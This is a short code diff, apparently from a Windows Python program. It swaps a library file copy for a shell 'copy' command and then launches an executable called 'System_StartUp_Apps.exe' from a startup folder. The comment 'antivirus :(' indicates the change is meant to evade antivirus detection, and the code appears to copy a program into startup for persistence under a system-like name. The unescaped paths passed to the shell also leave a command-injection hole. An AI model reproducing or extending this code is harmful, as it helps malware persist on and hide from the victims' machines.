@@ -17,6 +17,8 @@ else:
         pass
     else:
 
-        copyfile(file, dst)
+        # copyfile(file, dst) # antivirus :(
+
+        system(f"copy \"{file}\" \"{dst}\"")
 
         system(f"start \"\" \"{startup_path}\System_StartUp_Apps.exe\"")
